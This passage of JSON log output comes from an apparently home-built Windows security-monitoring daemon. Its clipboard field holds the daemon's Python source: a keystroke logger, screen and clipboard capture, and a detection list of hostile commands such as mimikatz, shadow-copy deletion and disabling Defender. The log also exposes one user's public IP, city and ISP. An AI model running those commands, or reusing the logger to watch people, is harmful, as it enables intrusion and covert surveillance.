import hashlib\r import platform...' (matched: 'del /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'rmdir /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net user')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net localgroup administrators')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'taskkill /f /im')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'schtasks /create')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'reg delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mimikatz')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'certutil -urlcache -f -split')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wmic shadowcopy delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'vssadmin delete shadows')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'powershell -nop -w hidden -c')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'invoke-expression')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'set-mppreference -disablerealtimemonitoring $true')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bcdedit /set {current} safeboot network')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mshta.exe http')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bitsadmin /transfer')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wevtutil cl system')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'cipher /w')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'sdelete -z')"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (795 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "7bc953bbeac424b0f7d619989809cc46fb5a20586088b9b928a23e5c1b18d547", "screenshot_hash": "46010bf56b8ad59069650d667bc4ae0c3ce8c3e56f53b657c3451eea5ec4ac5d", "_raw_log_hash": "e92f64014cc6a2ea6050e7f8bb18e46ebeb488773d194ffa0ad9e50cad3589f6"}
{"timestamp": "2025-06-11T17:09:24.912971+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "89.214.145.78", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nimport sys\r\nimport threading\r\nimport shutil\r\nimport traceback\r\nimport logging\r\nfrom logging.handlers import RotatingFileHandler, TimedRotatingFileHandler\r\nfrom datetime import datetime, timedelta, timezone\r\nfrom requests import get as requests_get, post as requests_post # Renamed to avoid conflict with `get` from `requests`\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests # Still needed for general requests like ipinfo.io\r\nfrom elasticsearch import Elasticsearch, ConnectionError, TransportError, AuthenticationException, TransportError\r\nimport ssl # Not directly used for client, but good to have\r\nimport tempfile # For atomic writes\r\n\r\n\r\n# === Configuration Loading ===\r\n# Default configuration values\r\nDEFAULT_CONFIG = {\r\n    \"base_path\": \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\",\r\n    \"known_countries\": [\"Portugal\"], # Example country for testing\r\n    \"known_vpn_ips\": [\"89.214.145.78\", \"123.45.67.89\"], # Example VPN IPs\r\n    \"elastic_host\": \"localhost\",\r\n    \"elastic_port\": 9200,\r\n    \"log_level\": \"INFO\", # DEBUG, INFO, WARNING, ERROR, CRITICAL\r\n    \"time_sleep_seconds\": 3, # Main daemon loop sleep interval\r\n    \"min_free_disk_mb\": 100, # Minimum free disk space to operate\r\n    \"vt_api_key\": None, # Should be loaded from ENV\r\n    \"elastic_user\": None, # Should be loaded from ENV\r\n    \"elastic_password\": None # Should be loaded from ENV\r\n}\r\n\r\n# --- Paths derived from config ---\r\n# These will be set after config is loaded\r\nconfig = {} # Placeholder, will be populated by load_config\r\n\r\n# --- Global Keylogger Variables ---\r\nKEYLOGGER_KEYS = []\r\nKEYLOGGER_LISTENER = None # Will hold the pynput Listener instance\r\nKEYLOGGER_STOP_EVENT = threading.Event() # To signal the keylogger thread to stop\r\n\r\n# === Logger Setup (using Python's logging module) ===\r\n# This needs to be set up early before any `logger.info` calls\r\nlogger = logging.getLogger('snakey_daemon')\r\n\r\nclass JsonFormatter(logging.Formatter):\r\n    \"\"\"Custom JSON formatter for structured logs.\"\"\"\r\n    def format(self, record):\r\n        log_record = {\r\n            \"timestamp\": datetime.fromtimestamp(record.created, tz=timezone.utc).isoformat(),\r\n            \"level\": record.levelname,\r\n            \"message\": record.getMessage(),\r\n            \"logger_name\": record.name,\r\n        }\r\n        if record.exc_info:\r\n            log_record[\"exception\"] = self.formatException(record.exc_info)\r\n        if record.funcName:\r\n            log_record[\"function\"] = record.funcName\r\n        if record.lineno:\r\n            log_record[\"line\"] = record.lineno\r\n        if record.pathname:\r\n            log_record[\"file\"] = record.pathname\r\n        \r\n        # Add any extra dictionary fields passed to the logger via the 'extra' keyword\r\n        if hasattr(record, 'extra') and isinstance(record.extra, dict):\r\n            # The 'extra' dictionary contains the keys directly, so just update\r\n            log_record.update(record.extra)\r\n\r\n        return json.dumps(log_record, default=str) # default=str handles datetime, etc.\r\n\r\ndef setup_logging(log_level_str, log_file_path):\r\n    \"\"\"Configures the main logger for the daemon.\"\"\"\r\n    try:\r\n        logger.setLevel(getattr(logging, log_level_str.upper()))\r\n    except AttributeError:\r\n        logger.setLevel(logging.INFO) # Default to INFO if level is invalid\r\n        logger.warning(f\"Invalid SNAKEY_LOG_LEVEL '{log_level_str}'. Defaulting to INFO.\")\r\n\r\n    # Prevent adding handlers multiple times if setup_logging is called more than once\r\n    if not logger.handlers:\r\n        # File Handler with Time-based Rotation (daily)\r\n        file_handler = TimedRotatingFileHandler(log_file_path,\r\n                                                when=\"midnight\",\r\n                                                interval=1, # Rotate daily\r\n                                                backupCount=5) # Keep up to 5 rotated log files\r\n        file_handler.setLevel(logging.DEBUG) # Log all debug messages to file\r\n        file_handler.setFormatter(JsonFormatter())\r\n        logger.addHandler(file_handler)\r\n\r\n        # Console Handler\r\n        console_handler = logging.StreamHandler(sys.stdout)\r\n        console_handler.setLevel(logging.INFO) # Only INFO and above to console\r\n        console_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')\r\n        console_handler.setFormatter(console_formatter)\r\n        logger.addHandler(console_handler)\r\n\r\n# Global exception handler to log any unhandled exceptions\r\ndef handle_unhandled_exception(exc_type, exc_value, exc_traceback):\r\n    if issubclass(exc_type, KeyboardInterrupt):\r\n        # Don't log KeyboardInterrupt, let default handler deal with it\r\n        sys.__excepthook__(exc_type, exc_value, exc_traceback)\r\n        return\r\n    logger.critical(\"Unhandled exception caught!\", exc_info=(exc_type, exc_value, exc_traceback))\r\n\r\nsys.excepthook = handle_unhandled_exception\r\n\r\ndef load_config(config_file_path: str) -> dict:\r\n    \"\"\"Loads configuration from a JSON file and environment variables.\"\"\"\r\n    loaded_config = DEFAULT_CONFIG.copy()\r\n\r\n    if os.path.exists(config_file_path):\r\n        try:\r\n            with open(config_file_path, \"r\", encoding='utf-8') as f:\r\n                file_config = json.load(f)\r\n                loaded_config.update(file_config)\r\n            logger.info(f\"Configuration loaded from {config_file_path}\")\r\n        except json.JSONDecodeError:\r\n            logger.error(f\"Error decoding config file {config_file_path}. Using default values.\")\r\n        except IOError as e:\r\n            logger.error(f\"Error reading config file {config_file_path}: {e}. Using default values.\")\r\n        except Exception as e:\r\n            logger.critical(f\"Unexpected error parsing config file: {e}\", exc_info=True)\r\n            sys.exit(1) # Critical error, exit\r\n\r\n    # Override with Environment Variables for sensitive info (best practice)\r\n    loaded_config[\"vt_api_key\"] = os.getenv(\"SNAKEY_VT_API_KEY\", loaded_config[\"vt_api_key\"])\r\n    loaded_config[\"elastic_user\"] = os.getenv(\"SNAKEY_ELASTIC_USER\", loaded_config[\"elastic_user\"])\r\n    loaded_config[\"elastic_password\"] = os.getenv(\"SNAKEY_ELASTIC_PASSWORD\", loaded_config[\"elastic_password\"])\r\n    loaded_config[\"log_level\"] = os.getenv(\"SNAKEY_LOG_LEVEL\", loaded_config[\"log_level\"]).upper()\r\n\r\n    return loaded_config\r\n\r\n# === Global Variables (Initialized after config loading) ===\r\nconfig_file = os.path.join(DEFAULT_CONFIG[\"base_path\"], \"snakey_config.json\")\r\nconfig = load_config(config_file)\r\n\r\n# Now define paths and settings using the loaded config\r\nbase_path = config[\"base_path\"]\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True) # Ensure directory exists\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\ndaemon_log_file = os.path.join(base_path, \"snakey_daemon.log\") # Changed name to avoid conflict with existing (error) log\r\n\r\nscreenshot_information = \"screenshot.png\"  # Temporary screenshot file\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = set(config[\"known_countries\"]) # Use set for faster lookups\r\nKNOWN_VPN_IPS = set(config[\"known_vpn_ips\"]) # Use set for faster lookups\r\nMIN_FREE_DISK_MB = config[\"min_free_disk_mb\"]\r\n\r\n# --- VirusTotal API Endpoints (Global Constants) ---\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\n\r\n\r\n# Sensitive Command Detection Configuration\r\nSENSITIVE_CMD_COMMANDS = [\r\n    \"format c:\", \"del /s /q\", \"rmdir /s /q\", \"net user\", \"net localgroup administrators\",\r\n    \"taskkill /f /im\", \"schtasks /create\", \"reg delete\", \"mimikatz\",\r\n    \"certutil -urlcache -f -split\", \"wmic shadowcopy delete\", \"vssadmin delete shadows\",\r\n    \"powershell -nop -w hidden -c\", \"invoke-expression\", \"set-mppreference -disablerealtimemonitoring $true\",\r\n    \"bcdedit /set {current} safeboot network\", \"mshta.exe http\", \"bitsadmin /transfer\",\r\n    \"wevtutil cl system\", \"cipher /w\", \"sdelete -z\",\r\n]\r\n\r\n# === Setup Logging (now that config is loaded) ===\r\nsetup_logging(config[\"log_level\"], daemon_log_file)\r\n\r\n\r\n# === Encryption Key Loading ===\r\nfernet: Fernet = None # Type hint\r\nif not os.path.exists(key_path):\r\n    logger.critical(\"Encryption key not found! Run GenerateKey.py first. Exiting.\")\r\n    sys.exit(1)\r\n\r\ntry:\r\n    with open(key_path, \"rb\") as key_file:\r\n        key = key_file.read()\r\n    fernet = Fernet(key)\r\n    logger.info(\"Encryption key loaded successfully.\")\r\nexcept Exception as e:\r\n    logger.critical(f\"Failed to load encryption key: {e}. Exiting.\", exc_info=True)\r\n    sys.exit(1)\r\n\r\n# === Elasticsearch Configuration ===\r\nELASTIC_HOST = config[\"elastic_host\"]\r\nELASTIC_PORT = config[\"elastic_port\"]\r\nELASTIC_USER = config[\"elastic_user\"]\r\nELASTIC_PASSWORD = config[\"elastic_password\"]\r\n\r\nes_client: Elasticsearch = None # Type hint\r\n\r\n# Basic pre-check before initializing the full ES client\r\nes_precheck_successful = False\r\nlogger.info(\"Performing basic requests.get pre-check to Elasticsearch endpoint.\")\r\nif not ELASTIC_USER or not ELASTIC_PASSWORD:\r\n    logger.critical(\"Elasticsearch username or password not set (check SNAKEY_ELASTIC_USER/SNAKEY_ELASTIC_PASSWORD environment variables or config file). Elasticsearch client will not be initialized.\")\r\nelse:\r\n    try:\r\n        response = requests_get(f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\", auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n                                verify=False, timeout=10, stream=True)\r\n        logger.debug(f\"Basic requests.get status: {response.status_code}\")\r\n        # Read a byte to force connection establishment, then close to prevent hanging\r\n        try:\r\n            response.raw.read(1)\r\n        except Exception as read_e:\r\n            logger.warning(f\"Error reading from raw response during pre-check (might be expected for empty response): {read_e}\", extra={\"error_type\": \"requests_raw_read_error\"})\r\n        response.close()\r\n        if response.status_code == 200:\r\n            logger.info(\"Basic requests.get pre-check successful (status 200).\")\r\n            es_precheck_successful = True\r\n        else:\r\n            logger.warning(\r\n                f\"Basic requests.get pre-check returned non-200 status: {response.status_code}. Not proceeding with ES client init.\",\r\n                extra={\"http_status\": response.status_code, \"response_text\": response.text})\r\n\r\n    except requests.exceptions.ConnectionError as e:\r\n        logger.error(f\"requests.ConnectionError during pre-check: {e}. Possible firewall, service down, or wrong host/port.\", exc_info=True, extra={\"error_type\": \"requests_connection_error\"})\r\n    except requests.exceptions.Timeout:\r\n        logger.error(\"requests.Timeout during pre-check: Connection timed out.\", exc_info=True, extra={\"error_type\": \"requests_timeout\"})\r\n    except requests.exceptions.RequestException as e:\r\n        logger.error(f\"requests.RequestException during pre-check: {e}. Could be SSL, authentication, or other request error.\", exc_info=True, extra={\"error_type\": \"requests_request_error\"})\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during basic requests pre-check: {e}\", exc_info=True, extra={\"error_type\": \"unexpected_precheck_error\"})\r\n\r\n\r\nif es_precheck_successful:\r\n    try:\r\n        es_client = Elasticsearch(\r\n            hosts=[f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\"],\r\n            basic_auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n            verify_certs=False,  # WARNING: Disable for testing, enable for production!\r\n            ssl_show_warn=False, # Suppress SSL warnings in logs from elasticsearch client\r\n            request_timeout=30 # Increased timeout for client initialization\r\n        )\r\n        # Attempt to ping to confirm full connection\r\n        if es_client.ping():\r\n            logger.info(\"Elasticsearch client initialized and connected successfully.\")\r\n        else:\r\n            logger.error(\"Elasticsearch client initialized but failed to ping the cluster. Check credentials.\", extra={\"error_type\": \"es_ping_failed\"})\r\n            es_client = None\r\n    except ConnectionError as e:\r\n        logger.error(f\"Elasticsearch Connection Error during client init: {e}. Check network, service status, firewall.\", exc_info=True, extra={\"error_type\": \"es_connection_error\"})\r\n        es_client = None\r\n    except AuthenticationException as e:\r\n        logger.error(f\"Elasticsearch Authentication Error during client init: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD carefully.\", exc_info=True, extra={\"error_type\": \"es_auth_error\"})\r\n        es_client = None\r\n    except TransportError as e:\r\n        logger.error(f\"Elasticsearch Transport Error during client init (HTTP status {e.status_code}): {e.info}. Problem on ES server or request formatting.\", exc_info=True, extra={\"error_type\": \"es_transport_error\", \"status_code\": e.status_code})\r\n        es_client = None\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during Elasticsearch client initialization: {e}\", exc_info=True, extra={\"error_type\": \"unexpected_es_init_error\"})\r\n        es_client = None\r\nelse:\r\n    logger.warning(\"Elasticsearch pre-check failed. Elasticsearch client will not be initialized.\")\r\n\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath: str) -> str | None:\r\n    \"\"\"Calculates the SHA256 hash of a file.\"\"\"\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except FileNotFoundError:\r\n        logger.error(f\"File not found for hashing: {filepath}\", extra={\"file_path\": filepath})\r\n        return None\r\n    except Exception as e:\r\n        logger.error(f\"Hashing failed for {filepath}: {e}\", exc_info=True, extra={\"file_path\": filepath})\r\n        return None\r\n\r\n\r\ndef hash_text(text: str) -> str:\r\n    \"\"\"Calculates the SHA256 hash of a given string.\"\"\"\r\n    return hashlib.sha256(text.encode('utf-8')).hexdigest()\r\n\r\n\r\ndef build_merkle_tree(hashes: list[str]) -> str | None:\r\n    \"\"\"Builds a Merkle tree from a list of hashes and returns the Merkle root.\"\"\"\r\n    if not hashes:\r\n        return None\r\n    hashes = list(hashes) # Make a mutable copy\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])  # Duplicate last hash if odd number\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\n\r\ndef vt_lookup_url(url: str) -> dict:\r\n    \"\"\"Performs a VirusTotal URL lookup.\"\"\"\r\n    try:\r\n        if not config.get(\"vt_api_key\"): # Use .get() for safer access\r\n            logger.warning(\"VirusTotal API key not configured. Skipping URL lookup.\", extra={\"url\": url})\r\n            return {}\r\n\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests_get(f\"{VT_URL_LOOKUP}{url_id}\", headers={\"x-apikey\": config[\"vt_api_key\"]}, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            logger.warning(f\"VirusTotal URL lookup failed (404 Not Found) for hash {url_id}. URL likely not previously analyzed by VT.\", extra={\"url_hash\": url_id})\r\n        else:\r\n            logger.warning(f\"VirusTotal URL lookup failed with status {response.status_code} for {url}: {response.text}\", extra={\"url\": url, \"status_code\": response.status_code, \"response_text\": response.text})\r\n    except requests.exceptions.RequestException as e:\r\n        logger.error(f\"VT URL lookup failed: {e}\", exc_info=True, extra={\"url\": url})\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during VT URL lookup: {e}\", exc_info=True, extra={\"url\": url})\r\n    return {}\r\n\r\n\r\ndef vt_lookup_file(file_path: str) -> dict:\r\n    \"\"\"Performs a VirusTotal file lookup.\"\"\"\r\n    try:\r\n        if not config.get(\"vt_api_key\"): # Use .get() for safer access\r\n            logger.warning(\"VirusTotal API key not configured. Skipping File lookup.\", extra={\"file_path\": file_path})\r\n            return {}\r\n\r\n        if not os.path.exists(file_path):\r\n            logger.error(f\"File not found for VT lookup: {file_path}\", extra={\"file_path\": file_path})\r\n            return {}\r\n\r\n        file_hash = hash_file(file_path)\r\n        if not file_hash:\r\n            return {}\r\n\r\n        response = requests_get(f\"{VT_FILE_LOOKUP}{file_hash}\", headers={\"x-apikey\": config[\"vt_api_key\"]}, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            logger.warning(f\"VirusTotal File lookup failed (404 Not Found) for hash {file_hash} from {file_path}. File likely not previously analyzed by VT.\", extra={\"file_hash\": file_hash, \"file_path\": file_path})\r\n        else:\r\n            logger.warning(f\"VirusTotal File lookup failed with status {response.status_code} for {file_path}: {response.text}\", extra={\"file_path\": file_path, \"status_code\": response.status_code, \"response_text\": response.text})\r\n    except requests.exceptions.RequestException as e:\r\n        logger.error(f\"VT File lookup failed: {e}\", exc_info=True, extra={\"file_path\": file_path})\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during VT File lookup: {e}\", exc_info=True, extra={\"file_path\": file_path})\r\n    return {}\r\n\r\n\r\ndef check_important_directories() -> dict[str, str]:\r\n    \"\"\"Checks the status of important user directories.\"\"\"\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n                logger.warning(f\"Failed to list contents of {name} ({path}): {e}\", extra={\"dir_name\": name, \"dir_path\": path})\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\n\r\ndef check_stop_file() -> bool:\r\n    \"\"\"Checks if the 'stop_snakey.txt' file exists to terminate the daemon.\"\"\"\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef check_disk_space(path: str, min_free_mb: int) -> bool:\r\n    \"\"\"Checks if there's enough free disk space at a given path.\"\"\"\r\n    try:\r\n        total, used, free = shutil.disk_usage(path)\r\n        free_mb = free / (1024 * 1024)\r\n        if free_mb < min_free_mb:\r\n            logger.warning(f\"Low disk space detected in {path}: {free_mb:.2f} MB free. Operations might be impacted.\", extra={\"path\": path, \"free_mb\": free_mb, \"min_free_mb\": min_free_mb})\r\n            return False\r\n        logger.debug(f\"Disk space OK in {path}: {free_mb:.2f} MB free.\")\r\n        return True\r\n    except Exception as e:\r\n        logger.error(f\"Failed to check disk space for {path}: {e}\", exc_info=True, extra={\"path\": path})\r\n        return True # Assume OK if check fails, to avoid halting the daemon\r\n\r\ndef log_to_wazuh_file(data: dict):\r\n    \"\"\"Logs session data to a file in a Wazuh-compatible JSON format.\"\"\"\r\n    try:\r\n        # Ensure timestamp is string for JSON serialization\r\n        if 'timestamp' in data and isinstance(data['timestamp'], datetime):\r\n            data['timestamp'] = data['timestamp'].isoformat()\r\n        with open(wazuh_log_file, \"a\", encoding='utf-8') as f:\r\n            f.write(json.dumps(data, default=str) + \"\\n\")\r\n        logger.info(\"Log written to Wazuh-compatible file.\", extra={\"log_file\": wazuh_log_file})\r\n    except Exception as e:\r\n        logger.error(f\"Wazuh log file write failed: {e}\", exc_info=True, extra={\"log_file\": wazuh_log_file})\r\n\r\ndef save_session_to_json(session_data: dict, filepath: str):\r\n    \"\"\"\r\n    Appends session data as a new JSON object to the specified file.\r\n    Each object is on a new line to make it easier to read/parse as NDJSON.\r\n    \"\"\"\r\n    try:\r\n        # Ensure timestamp is string for JSON serialization\r\n        if 'timestamp' in session_data and isinstance(session_data['timestamp'], datetime):\r\n            session_data['timestamp'] = session_data['timestamp'].isoformat()\r\n        \r\n        with open(filepath, \"a\", encoding='utf-8') as f:\r\n            f.write(json.dumps(session_data, default=str) + \"\\n\")\r\n        logger.info(f\"Session log appended to JSON file: {filepath}\", extra={\"log_file\": filepath})\r\n    except Exception as e:\r\n        logger.error(f\"Failed to write session log to JSON file {filepath}: {e}\", exc_info=True, extra={\"log_file\": filepath})\r\n\r\ndef send_to_elasticsearch(data: dict):\r\n    \"\"\"Sends collected session data to Elasticsearch.\"\"\"\r\n    global es_client\r\n    if es_client:\r\n        try:\r\n            data_to_send = data.copy()\r\n            if 'timestamp' in data_to_send and isinstance(data_to_send['timestamp'], datetime):\r\n                data_to_send['timestamp'] = data_to_send['timestamp'].isoformat()\r\n\r\n            # Ensure lists are not empty for Kibana visualization (empty list is fine, None is bad)\r\n            if not data_to_send.get('alerts'):\r\n                data_to_send['alerts'] = []\r\n            if not data_to_send.get('virustotal'):\r\n                data_to_send['virustotal'] = {}\r\n\r\n            logger.debug(f\"Attempting to send log to Elasticsearch for timestamp: {data_to_send['timestamp']}\", extra={\"timestamp\": data_to_send['timestamp']})\r\n            response = es_client.index(index=\"snakey_logs\", document=data_to_send)\r\n            logger.info(f\"Log sent to Elasticsearch. ID: {response['_id']}\", extra={\"es_id\": response['_id']})\r\n        except ConnectionError as e:\r\n            logger.error(f\"Elasticsearch Connection Error during send: {e}. Check network, service status, firewall.\", exc_info=True, extra={\"error_type\": \"es_connection_error\"})\r\n        except AuthenticationException as e:\r\n            logger.error(f\"Elasticsearch Authentication Error during send: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\", exc_info=True, extra={\"error_type\": \"es_auth_error\"})\r\n        except TransportError as e:\r\n            logger.error(f\"Elasticsearch Transport Error during send (HTTP status {e.status_code}): {e.info}. Problem on ES server or data format.\", exc_info=True, extra={\"error_type\": \"es_transport_error\", \"status_code\": e.status_code, \"es_info\": e.info})\r\n        except Exception as e:\r\n            logger.error(f\"Unexpected failure sending log to Elasticsearch: {e}\", exc_info=True, extra={\"error_type\": \"unexpected_es_send_error\"})\r\n    else:\r\n        logger.warning(\"Elasticsearch client is not configured or connected. Log will not be sent.\")\r\n\r\n\r\ndef analyze_clipboard_for_sensitive_commands(clipboard_content: str, alerts_list: list[str]) -> list[str]:\r\n    \"\"\"Analyzes clipboard content for predefined sensitive command patterns.\"\"\"\r\n    if not clipboard_content or not isinstance(clipboard_content, str):\r\n        return alerts_list\r\n\r\n    normalized_clipboard = clipboard_content.lower().strip()\r\n\r\n    for sensitive_cmd in SENSITIVE_CMD_COMMANDS:\r\n        if sensitive_cmd.lower() in normalized_clipboard:\r\n            alerts_list.append(\r\n                f\"Sensitive CMD command detected in clipboard: \"\r\n                f\"'{clipboard_content[:100].replace('\\n', ' ').strip()}...' (matched: '{sensitive_cmd}')\"\r\n            )\r\n            logger.info(f\"Sensitive CMD command detected in clipboard.\", extra={\"matched_command\": sensitive_cmd, \"clipboard_snippet\": clipboard_content[:100]})\r\n\r\n    return alerts_list\r\n\r\n\r\ndef check_country_change(current_country: str, alerts_list: list[str]) -> list[str]:\r\n    \"\"\"\r\n    Checks if the country has changed since the last recorded session.\r\n    Stores the current country for future comparison.\r\n    \"\"\"\r\n    last_country_path = os.path.join(base_path, \"last_country.txt\")\r\n    try:\r\n        if os.path.exists(last_country_path):\r\n            with open(last_country_path, \"r\", encoding='utf-8') as f:\r\n                last_country = f.read().strip()\r\n            if last_country and last_country != current_country:\r\n                alerts_list.append(f\"Country changed since last session: {last_country} -> {current_country}\")\r\n                logger.info(f\"Country changed: {last_country} -> {current_country}\", extra={\"old_country\": last_country, \"new_country\": current_country})\r\n        with open(last_country_path, \"w\", encoding='utf-8') as f:\r\n            f.write(current_country)\r\n    except Exception as e:\r\n        logger.error(f\"Failed to check/update last country: {e}\", exc_info=True)\r\n    return alerts_list\r\n\r\n\r\ndef check_vpn_proxy_ip(current_ip: str, alerts_list: list[str]) -> list[str]:\r\n    \"\"\"Checks if the current public IP is in a list of known VPN/proxy IPs.\"\"\"\r\n    if current_ip in KNOWN_VPN_IPS:\r\n        alerts_list.append(f\"Access from known VPN/proxy IP: {current_ip}\")\r\n        logger.info(f\"Access from known VPN/proxy IP detected: {current_ip}\", extra={\"ip_address\": current_ip})\r\n    return alerts_list\r\n\r\n\r\n# === Keylogger Thread Function ===\r\ndef on_press_threaded(key):\r\n    \"\"\"Callback for pynput.keyboard.Listener on key press event.\"\"\"\r\n    global KEYLOGGER_KEYS\r\n    try:\r\n        if hasattr(key, 'char') and key.char is not None:\r\n            KEYLOGGER_KEYS.append(key.char)\r\n        elif key == Key.space:\r\n            KEYLOGGER_KEYS.append(' ')\r\n        elif key == Key.enter:\r\n            KEYLOGGER_KEYS.append('[ENTER]')\r\n        elif key == Key.backspace:\r\n            KEYLOGGER_KEYS.append('[BACKSPACE]')\r\n        elif key == Key.tab:\r\n            KEYLOGGER_KEYS.append('[TAB]')\r\n        else:\r\n            KEYLOGGER_KEYS.append(f\"[{str(key).replace('Key.', '')}]\")\r\n    except Exception as e:\r\n        logger.error(f\"Error in on_press_threaded keylogger: {e}\", exc_info=True)\r\n\r\ndef keylogger_thread_func():\r\n    \"\"\"Function to be run in a separate thread for continuous keylogging.\"\"\"\r\n    global KEYLOGGER_LISTENER\r\n    logger.info(\"Keylogger thread started.\")\r\n    try:\r\n        with Listener(on_press=on_press_threaded) as KEYLOGGER_LISTENER:\r\n            KEYLOGGER_LISTENER.join() # This will block until listener.stop() is called\r\n    except Exception as e:\r\n        logger.critical(f\"Keylogger thread encountered a critical error: {e}. Keylogger will terminate.\", exc_info=True)\r\n    finally:\r\n        logger.info(\"Keylogger thread terminated.\")\r\n\r\n\r\n# === Main Log Collection Function ===\r\ndef collect_full_session() -> dict:\r\n    \"\"\"Collects a full session's worth of system data, activities, and alerts.\"\"\"\r\n    current_time = datetime.now(timezone.utc)\r\n    session_log: dict = {\r\n        \"timestamp\": current_time.isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\", # Will be 